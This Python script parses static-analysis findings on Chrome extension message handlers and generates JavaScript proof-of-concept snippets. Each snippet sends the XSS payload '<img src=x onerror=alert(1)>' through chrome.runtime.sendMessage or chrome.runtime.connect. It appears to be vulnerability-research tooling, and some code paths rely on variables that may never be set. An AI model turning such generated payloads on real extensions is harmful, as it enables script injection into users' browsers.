import json

f = open('s.json')

results = json.load(f)

data = []

for i in results["results"]:
    data.append(i)

tainted = []
other_vars = []
scripts = []

def runtime_onC(extid, payload, ssm, msgvar):
    for i in ssm:
        html = 'rHTML'
        dots = '.'
        underscore = '_'
        function = 'function'
        ifs = 'if'
        openb = '('
        closeb = ')'
        equivalent = '==='
        message = i["message"]
        if html in message:
            sink_split = message.split("Sink:")
            sink = sink_split[-1]
        elif dots in message:
            sink_split = message.split(dots)
            sink = sink_split[-1]
        elif underscore in message:
            sink_split = message.split(underscore)
            sink = sink_split[-1]
        
        taintsink = i["sink"]
        taintsource = i["source"]
        try:
            if msgvar[1]:
                x = msgvar[1]
        except:
            x = msgvar[0]
        functionvar = taintsource.find(function)
        varfirst = taintsource.find(x)
        if varfirst == -1:
            if dots in taintsink:
                tsink = taintsink.split(dots)
                obj = {tsink[-1]:payload}
                obj = json.dumps(obj)
            var = f"obj = JSON.parse('{obj}');"
            func = f'obj.postMessage({payload})'
        elif functionvar < varfirst:
            ifvar = taintsource.find(ifs,varfirst)
            if ifvar:
                obrack = taintsource.find(openb,ifvar)
                equiv = taintsource.find(equivalent,ifvar)
                cbrack = taintsource.find(closeb,obrack)
                if obrack<equiv<cbrack and obrack!=-1:
                    constvar = taintsource[obrack:cbrack]
                    constvar = constvar.replace(" ","")
                    constvar = constvar.split(equivalent)
                    if dots in constvar[0]:
                        portvar = constvar[0].split(dots)
                        constvar[0] = portvar[1]
                    if "'" in constvar[1]:
                        constvar[1] = constvar[1].replace("'",'')
                    obj = {constvar[0]:constvar[1]}
                    obj = json.dumps(obj)

            var = f"obj = JSON.parse('{obj}');"
            func = f"obj.postMessage({payload})"

        script = f"{var}chrome.runtime.connect({extid},{func})"
        scripts.append(script)

def runtime_onM(extid, payload, ssm, msgvar):

    html = 'rHTML'
    dots = '.'
    underscore = '_'
    message = ssm[0]["message"]
    if html in message:
        sink_split = message.split('Sink:')
        sink = sink_split[-1]
    elif dots in message:
        sink_split = message.split(dots)
        sink = sink_split[-1]
    elif underscore in message:
        sink_split = message.split(underscore)
        sink = sink_split[-1]
    
    taintsink = ssm[0]["sink"]
    
    varindex = taintsink.find(sink+"(") + sink.__len__() + 1
    for i in msgvar:
        msgindex = taintsink.find(i)
        if msgindex == -1:
            continue
        elif varindex == msgindex:
            #source is here
            endvarindex = taintsink.find(")",varindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[varindex:endvarindex]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
        else:
            endvarindex = taintsink.find(")",msgindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[msgindex:endvarindex]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
    
    script = f'obj = JSON.parse("{obj}");chrome.runtime.sendMessage({extid},obj)'
    return script

for i in data:
    if "chrome_runtime_onMessage" in i["check_id"]:
        taint = {}
        taint_sink = i["extra"]["dataflow_trace"]["taint_sink"][1][1]
        taint_source = i["extra"]["dataflow_trace"]["taint_source"][1][1]
        metavars = []
        for j in i["extra"]["dataflow_trace"]["intermediate_vars"]:
            metavars.append(j["content"])
        other_vars.append({"content":metavars})
        message = i["extra"]["message"]
        taint["message"] = message
        taint["source"] = taint_source
        taint["sink"] = taint_sink
        tainted.append(taint)
        print(runtime_onM("extid","<img src=x onerror=alert(1)>",tainted,metavars))

    if "chrome_runtime_onConnect" in i["check_id"]:
        taint = {}
        taint_sink = i["extra"]["dataflow_trace"]["taint_sink"][1][1]
        taint_source = i["extra"]["dataflow_trace"]["taint_source"][1][1]
        metavars = []
        try:
            if i["extra"]["metavars"]["$OBJ"]:
                metavars.append(i["extra"]["metavars"]["$OBJ"]["abstract_content"])
        except:
            print(1)
        if i["extra"]["metavars"]["$X"]:
            metavars.append(i["extra"]["metavars"]["$X"]["abstract_content"])
        other_vars.append({"content":metavars})
        message = i["extra"]["message"]
        taint["message"] = message
        taint["source"] = taint_source
        taint["sink"] = taint_sink
        tainted.append(taint)

runtime_onC('extid','<img src=x onerror=alert(1)>',tainted,metavars)
for i in scripts:
    print(i)

